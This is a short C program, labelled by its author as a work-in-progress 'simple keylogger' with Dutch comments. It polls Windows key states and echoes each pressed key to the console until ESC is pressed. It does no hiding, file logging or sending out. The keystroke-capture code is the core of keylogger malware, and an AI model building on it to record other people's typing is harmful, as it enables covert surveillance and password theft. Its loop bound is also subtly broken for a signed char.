/*
    Simple keylogger
    Work in progress
    - Mauro Sterckx
*/

#include <stdio.h>
#include <windows.h>

int main(){

    while(1){
        for (char c = 8; c <= 255; ++c){// loop door alle mogelijke toetsen
            if (GetAsyncKeyState(c) & 1){ // check of toets is ingedrukt
                if (c == 27){ // check of toets esc is
                    printf("ESC ingedrukt, stop programma");
                    return 0;
                }
                else{ // print key
                    printf("%c", c);
                    fflush(stdout); // forceer output om te printen
                }
            }
        }
        Sleep(100);
    }

    return 0;
}